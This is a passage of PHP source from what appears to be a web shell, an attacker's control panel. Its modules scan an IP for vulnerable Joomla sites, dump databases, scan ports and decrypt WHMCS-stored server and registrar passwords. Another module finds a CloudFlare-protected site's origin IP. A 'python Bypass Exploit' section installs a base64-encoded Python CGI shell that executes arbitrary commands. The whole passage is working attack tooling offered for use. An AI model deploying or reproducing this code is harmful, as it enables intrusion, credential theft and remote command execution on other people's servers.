                            echo'<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>CMS</b></center></td></table><br><br>';
                            $content = file_get_contents($pageURL.'pee.tmp');
                            echo $content;
                        }
                        }
                        /////////////////////////////////////////////////////////////////
                        elseif(isset($_GET['x']) && ($_GET['x'] == 'jss'))
                        {
                        ?>
                        <form action="?y=<?php echo $pwd; ?>&x=jss" method="post">
                            <?php
                            echo '

<br><br><br><p align="center"><b><font size="3">Enter Targeting IP</font></b></p><br>
<form method="POST">
        <p align="center"><input type="text" class="inputz" name="site" size="65"><input class="inputzbut" type="submit" value="Scan"></p>
</form><center>

';
                            @set_time_limit(0);
                            @error_reporting(E_ALL | E_NOTICE);

                            function check_exploit($comxx){

                                $link ="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$comxx&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";

                                $result = @file_get_contents($link);

                                if (eregi("No results",$result))  {

                                    echo"<td>Not Found</td><td><a href='http://www.google.com/#hl=en&q=download+$comxx+joomla+extension'>Download</a></td></tr>";

                                }else{

                                    echo"<td><a href='$link'>Found</a></td><td><=</td></tr>";

                                }
                            }

                            function check_com($url){

                                $source = @file_get_contents($url);

                                preg_match_all('{option,(.*?)/}i',$source,$f);
                                preg_match_all('{option=(.*?)(&amp;|&|")}i',$source,$f2);
                                preg_match_all('{/components/(.*?)/}i',$source,$f3);

                                $arz=array_merge($f2[1],$f[1],$f3[1]);

                                $coms=array();

                                foreach(array_unique($arz) as $x){
                                    $coms[]=$x;
                                }

                                foreach($coms as $comm){

                                    echo "<tr><td>$comm</td>";
                                    check_exploit($comm);
                                }

                            }

                            function sec($site){
                                preg_match_all('{http://(.*?)(/index.php)}siU',$site, $sites);
                                if(eregi("www",$sites[0][0])){
                                    return $site=str_replace("index.php","",$sites[0][0]);
                                }else{
                                    return $site=str_replace("http://","http://www.",str_replace("index.php","",$sites[0][0]));
                                }}

                            $npages = 50000;

                            if ($_POST)
                            {
                                $ip = trim(strip_tags($_POST['site']));
                                $npage = 1;
                                $allLinks = array();


                                while($npage <= $npages)
                                {

                                    $x=@file_get_contents('http://www.bing.com/search?q=ip%3A' . $ip . '+index.php?option=com&first=' . $npage);


                                    if ($x)
                                    {
                                        preg_match_all('(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>siU', $x, $findlink);

                                        foreach ($findlink[1] as $fl)

                                            $allLinks[]=sec($fl);


                                        $npage = $npage + 10;

                                        if (preg_match('(first=' . $npage . '&amp)siU', $x, $linksuiv) == 0)
                                            break;
                                    }

                                    else
                                        break;
                                }


                                $allDmns = array();

                                foreach ($allLinks as $kk => $vv){

                                    $allDmns[] = $vv;
                                }

                                echo'<table border="1"  width=\"80%\" align=\"center\">
<tr><td width=\"30%\"><b>Server IP&nbsp;&nbsp;&nbsp;&nbsp; : </b></td><td><font color="red"><b>'.$ip.'</b></font></td></tr>                    
<tr><td width=\"30%\"><b>Sites Found&nbsp; : </b></td><td><b>'.count(array_unique($allDmns)).'</b></td></tr>
</table>';
                                echo "<br><br>";

                                echo'<table border="1" width="80%" align=\"center\">';

                                foreach(array_unique($allDmns) as $h3h3){

                                    echo'<tr id=new><td><b><a href='.$h3h3.'>'.$h3h3.'</a></b></td><td><b>Exploit-db</b></td><td><b>challenge of Exploiting ..!</b></td></tr>';

                                    check_com($h3h3);

                                }

                                echo"</table>";

                            }
                            }
                            /////////////////////////////////////////////////////////////////
                            elseif(isset($_GET['x']) && ($_GET['x'] == 'dump'))
                            {
                            ?>
                            <form action="?y=<?php echo $pwd; ?>&x=dump" method="post">
                                <?php
                                echo $head.'<p align="center">';
                                echo '
<table width=371 class=tabnet >
<tr><th colspan="2">Database Dump</th></tr>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="'.$me.'">
	<select class="inputz" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
	</form></center></table>';
                                if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
                                    $date = date("Y-m-d");
                                    $dbserver = $_POST['server'];
                                    $dbuser = $_POST['username'];
                                    $dbpass = $_POST['password'];
                                    $dbname = $_POST['dbname'];
                                    $file = "Dump-$dbname-$date";
                                    $method = $_POST['method'];
                                    if ($method=='sql'){
                                        $file="Dump-$dbname-$date.sql";
                                        $fp=fopen($file,"w");
                                    }else{
                                        $file="Dump-$dbname-$date.sql.gz";
                                        $fp = gzopen($file,"w");
                                    }
                                    function write($data) {
                                        global $fp;
                                        if ($_POST['method']=='ssql'){
                                            fwrite($fp,$data);
                                        }else{
                                            gzwrite($fp, $data);
                                        }}
                                    mysql_connect ($dbserver, $dbuser, $dbpass);
                                    mysql_select_db($dbname);
                                    $tables = mysql_query ("SHOW TABLES");
                                    while ($i = mysql_fetch_array($tables)) {
                                        $i = $i['Tables_in_'.$dbname];
                                        $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
                                        write($create['Create Table'].";\n\n");
                                        $sql = mysql_query ("SELECT * FROM ".$i);
                                        if (mysql_num_rows($sql)) {
                                            while ($row = mysql_fetch_row($sql)) {
                                                foreach ($row as $j => $k) {
                                                    $row[$j] = "'".mysql_escape_string($k)."'";
                                                }
                                                write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
                                            }
                                        }
                                    }
                                    if ($method=='ssql'){
                                        fclose ($fp);
                                    }else{
                                        gzclose($fp);}
                                    header("Content-Disposition: attachment; filename=" . $file);
                                    header("Content-Type: application/download");
                                    header("Content-Length: " . filesize($file));
                                    flush();

                                    $fp = fopen($file, "r");
                                    while (!feof($fp))
                                    {
                                        echo fread($fp, 65536);
                                        flush();
                                    }
                                    fclose($fp);
                                }

                                }
                                /////////////////////////////////////////////////////////////////
                                elseif(isset($_GET['x']) && ($_GET['x'] == 'port-sc'))
                                {
                                ?>
                                <form action="?y=<?php echo $pwd; ?>&x=port-sc" method="post">
                                    <?php
                                    echo '<br><br><center><br><b>+--=[ Port Scanner ]=--+</b><br>';
                                    $start = strip_tags($_POST['start']);
                                    $end = strip_tags($_POST['end']);
                                    $host = strip_tags($_POST['host']);
                                    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
                                        for($i = $start; $i<=$end; $i++){
                                            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
                                            if($fp){
                                                echo 'Port '.$i.' is <font color=green>open</font><br>';
                                            }
                                            flush();
                                        }
                                    }else{
                                        echo '<table class=tabnet style="width:300px;padding:0 1px;">
   <input type="hidden" name="y" value="phptools">
   <tr><th colspan="5">Port Scanner</th></center></tr>
   <tr>
		<td>Host</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="host" value="localhost"/></td>
   </tr>
   <tr>
		<td>Port start</td>
		<td><input type="text" class="inputz" style="width:220px;color:#00ff00;" name="start" value="0"/></td>
   </tr>
	<tr><td>Port end</td>
		<td><input type="text" class="inputz"  style="width:220px;color:#00ff00;" name="end" value="5000"/></td>
   </tr><td><input class="inputzbut" type="submit" style="color:#00ff00" value="Scan Ports" />
   </td></form></center></table>';
                                    }
                                    }
                                    /////////////////////////////////////////////////////////////////

                                    elseif(isset($_GET['x']) && ($_GET['x'] == 'hash'))
                                    {
                                        $submit= $_POST['enter'];
                                        if (isset($submit)) {
                                            $pass = $_POST['password']; // password
                                            $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
                                            $hash = md5($pass); // md5 hash #1
                                            $md4 = hash("md4",$pass);
                                            $hash_md5 = md5($salt.$pass); // md5 hash with salt #2
                                            $hash_md5_double = md5(sha1($salt.$pass)); // md5 hash with salt & sha1 #3
                                            $hash1 = sha1($pass); // sha1 hash #4
                                            $sha256 = hash("sha256",$text);
                                            $hash1_sha1 = sha1($salt.$pass); // sha1 hash with salt #5
                                            $hash1_sha1_double = sha1(md5($salt.$pass)); // sha1 hash with salt & md5 #6
                                        }
                                        echo '<form action="" method="post"><b><table class=tabnet>';
                                        echo '<tr><th colspan="2">Password Hash</th></center></tr>';
                                        echo '<tr><td><b>masukan kata yang ingin di encrypt:</b></td>';
                                        echo '<td><input class="inputz" type="text" name="password" size="40" />';
                                        echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
                                        echo '</td></tr><br>';
                                        echo '<tr><th colspan="2">Hasil Hash</th></center></tr>';
                                        echo '<tr><td>Original Password</td><td><input class=inputz type=text size=50 value='.$pass.'></td></tr><br><br>';
                                        echo '<tr><td>MD5</td><td><input class=inputz type=text size=50 value='.$hash.'></td></tr><br><br>';
                                        echo '<tr><td>MD4</td><td><input class=inputz type=text size=50 value='.$md4.'></td></tr><br><br>';
                                        echo '<tr><td>MD5 with Salt</td><td><input class=inputz type=text size=50 value='.$hash_md5.'></td></tr><br><br>';
                                        echo '<tr><td>MD5 with Salt & Sha1</td><td><input class=inputz type=text size=50 value='.$hash_md5_double.'></td></tr><br><br>';
                                        echo '<tr><td>Sha1</td><td><input class=inputz type=text size=50 value='.$hash1.'></td></tr><br><br>';
                                        echo '<tr><td>Sha256</td><td><input class=inputz type=text size=50 value='.$sha256.'></td></tr><br><br>';
                                        echo '<tr><td>Sha1 with Salt</td><td><input class=inputz type=text size=50 value='.$hash1_sha1.'></td></tr><br><br>';
                                        echo '<tr><td>Sha1 with Salt & MD5</td><td><input class=inputz type=text size=50 value='.$hash1_sha1_double.'></td></tr><br><br></table>';
                                    }

                                    /////////////////////////////////////////////////////////////////
                                    elseif(isset($_GET['x']) && ($_GET['x'] == 'whmcs'))
                                    {
                                    ?>
                                    <form action="?y=<?php echo $pwd; ?>&amp;x=whmcs" method="post">

                                        <?php

                                        function decrypt ($string,$cc_encryption_hash)
                                        {
                                            $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
                                            $hash_key = _hash ($key);
                                            $hash_length = strlen ($hash_key);
                                            $string = base64_decode ($string);
                                            $tmp_iv = substr ($string, 0, $hash_length);
                                            $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
                                            $iv = $out = '';
                                            $c = 0;
                                            while ($c < $hash_length)
                                            {
                                                $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
                                                ++$c;
                                            }
                                            $key = $iv;
                                            $c = 0;
                                            while ($c < strlen ($string))
                                            {
                                                if (($c != 0 AND $c % $hash_length == 0))
                                                {
                                                    $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
                                                }
                                                $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
                                                ++$c;
                                            }
                                            return $out;
                                        }

                                        function _hash ($string)
                                        {
                                            if (function_exists ('sha1'))
                                            {
                                                $hash = sha1 ($string);
                                            }
                                            else
                                            {
                                                $hash = md5 ($string);
                                            }
                                            $out = '';
                                            $c = 0;
                                            while ($c < strlen ($hash))
                                            {
                                                $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
                                                $c += 2;
                                            }
                                            return $out;
                                        }

                                        echo "
<br><center><font size='5' color='#00ff00'><b>-=[ WHMCS Decoder ]=-</b></font></center>
<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr> 
<tr><td>db_host </td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#00ff00;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#00ff00;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#00ff00;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";

                                        if($_POST['form_action'] == 2 )
                                        {
                                            //include($file);
                                            $db_host=($_POST['db_host']);
                                            $db_username=($_POST['db_username']);
                                            $db_password=($_POST['db_password']);
                                            $db_name=($_POST['db_name']);
                                            $cc_encryption_hash=($_POST['cc_encryption_hash']);



                                            $link=mysql_connect($db_host,$db_username,$db_password) ;
                                            mysql_select_db($db_name,$link) ;
                                            $query = mysql_query("SELECT * FROM tblservers");
                                            while($v = mysql_fetch_array($query)) {
                                                $ipaddress = $v['ipaddress'];
                                                $username = $v['username'];
                                                $type = $v['type'];
                                                $active = $v['active'];
                                                $hostname = $v['hostname'];
                                                echo("<center><table border='1'>");
                                                $password = decrypt ($v['password'], $cc_encryption_hash);
                                                echo("<tr><td>Type</td><td>$type</td></tr>");
                                                echo("<tr><td>Active</td><td>$active</td></tr>");
                                                echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
                                                echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
                                                echo("<tr><td>Username</td><td>$username</td></tr>");
                                                echo("<tr><td>Password</td><td>$password</td></tr>");

                                                echo "</table><br><br></center>";
                                            }

                                            $link=mysql_connect($db_host,$db_username,$db_password) ;
                                            mysql_select_db($db_name,$link) ;
                                            $query = mysql_query("SELECT * FROM tblregistrars");
                                            echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
                                            echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
                                            while($v = mysql_fetch_array($query)) {
                                                $registrar     = $v['registrar'];
                                                $setting = $v['setting'];
                                                $value = decrypt ($v['value'], $cc_encryption_hash);
                                                if ($value=="") {
                                                    $value=0;
                                                }
                                                $password = decrypt ($v['password'], $cc_encryption_hash);
                                                echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
                                            }
                                        }
                                        }

                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'bypass-cf'))
                                        {
                                            echo '
<form method="POST"><br><br>
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass
<font color="#CC0000">CloudFlare</font> ]=--+</font></b></p>
<select class="inputz" name="krz">
	<option>ftp</option>
		<option>direct-conntect</option>
			<option>webmail</option>
				<option>cpanel</option>
</select>
<input class="inputz" type="text" name="target" value="url">
<input class="inputzbut" type="submit" value="Bypass"></center>

';

                                            $target = $_POST['target'];
# Bypass From FTP
                                            if($_POST['krz'] == "ftp") {
                                                $ftp = gethostbyname("ftp."."$target");
                                                echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
                                            }
# Bypass From Direct-Connect
                                            if($_POST['krz'] == "direct-conntect") {
                                                $direct = gethostbyname("direct-connect."."$target");
                                                echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
                                            }
# Bypass From Webmail
                                            if($_POST['krz'] == "webmail") {
                                                $web = gethostbyname("webmail."."$target");
                                                echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
                                            }
# Bypass From Cpanel
                                            if($_POST['krz'] == "cpanel") {
                                                $cpanel = gethostbyname("cpanel."."$target");
                                                echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='#00ff00'>Correct 
ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
                                            }
                                        }
                                        //////////////////////////////////////////////////////////////////////////////////////////////



                                        //////////////////////////////////////////////////////////////////////////////////////////////

                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'hashid')) {
                                            if(isset($_POST['gethash'])){
                                                $hash = $_POST['hash'];
                                                if(strlen($hash)==32){
                                                    $hashresult = "MD5 Hash";
                                                }elseif(strlen($hash)==40){
                                                    $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
                                                }elseif(strlen($hash)==13){
                                                    $hashresult = "DES(Unix) Hash";
                                                }elseif(strlen($hash)==16){
                                                    $hashresult = "MySQL Hash / /DES(Oracle Hash)";
                                                }elseif(strlen($hash)==41){
                                                    $GetHashChar = substr($hash, 40);
                                                    if($GetHashChar == "*"){
                                                        $hashresult = "MySQL5 Hash";
                                                    }
                                                }elseif(strlen($hash)==64){
                                                    $hashresult = "SHA-256 Hash";
                                                }elseif(strlen($hash)==96){
                                                    $hashresult = "SHA-384 Hash";
                                                }elseif(strlen($hash)==128){
                                                    $hashresult = "SHA-512 Hash";
                                                }elseif(strlen($hash)==34){
                                                    if(strstr($hash, '$1$')){
                                                        $hashresult = "MD5(Unix) Hash";
                                                    }
                                                }elseif(strlen($hash)==37){
                                                    if(strstr($hash, '$apr1$')){
                                                        $hashresult = "MD5(APR) Hash";
                                                    }
                                                }elseif(strlen($hash)==34){
                                                    if(strstr($hash, '$H$')){
                                                        $hashresult = "MD5(phpBB3) Hash";
                                                    }
                                                }elseif(strlen($hash)==34){
                                                    if(strstr($hash, '$P$')){
                                                        $hashresult = "MD5(Wordpress) Hash";
                                                    }
                                                }elseif(strlen($hash)==39){
                                                    if(strstr($hash, '$5$')){
                                                        $hashresult = "SHA-256(Unix) Hash";
                                                    }
                                                }elseif(strlen($hash)==39){
                                                    if(strstr($hash, '$6$')){
                                                        $hashresult = "SHA-512(Unix) Hash";
                                                    }
                                                }elseif(strlen($hash)==24){
                                                    if(strstr($hash, '==')){
                                                        $hashresult = "MD5(Base-64) Hash";
                                                    }
                                                }else{
                                                    $hashresult = "Hash type not found";
                                                }
                                            }else{
                                                $hashresult = "Not Hash Entered";
                                            }

                                            ?>
                                            <center><br><Br><br>

                                                <form action="" method="POST">
                                                    <tr>
                                                        <table class="tabnet">
                                                            <th colspan="5">Hash Identification</th>
                                                            <tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
                                                            <tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
                                                        </table></tr></form>
                                            </center>

                                            <?php
                                        }
                                        //////////////////////////////////////////////////////////////////////////////////////////////
                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'python')) {
                                            echo "<center/><br/><b>
 +--==[ python  Bypass Exploit ]==--+ 
 </b><br><br>";


                                            mkdir('python', 0755);
                                            chdir('python');
                                            $kokdosya = ".htaccess";
                                            $dosya_adi = "$kokdosya";
                                            $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
                                            $metin = "AddHandler cgi-script .izo";
                                            fwrite ( $dosya , $metin ) ;
                                            fclose ($dosya);
                                            $pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';

                                            $file = fopen("python.izo" ,"w+");
                                            $write = fwrite ($file ,base64_decode($pythonp));
                                            fclose($file);
                                            chmod("python.izo",0755);
                                            echo " <iframe src=python/python.izo width=96% height=76% frameborder=0></iframe>
 
 </div>"; }

                                        //////////////////////////////////////////////////////////////////////////////////////////////
                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'string')){
                                        $text = $_POST['code'];
                                        ?><center><br><br><b>+--=[ Script Encode & Decode ]=--+</b><br><br>
                                            <form method="post"><br><br><br>
                                                <textarea class='inputz' cols=80 rows=10 name="code"></textarea><br><br>
                                                <select class='inputz' size="1" name="ope">
                                                    <option value="base64">Base64</option>
                                                    <option value="super">str_rot13 - gzinflate - str_rot13 - base64 - gzinflate - str_rot13 -  base64</option>
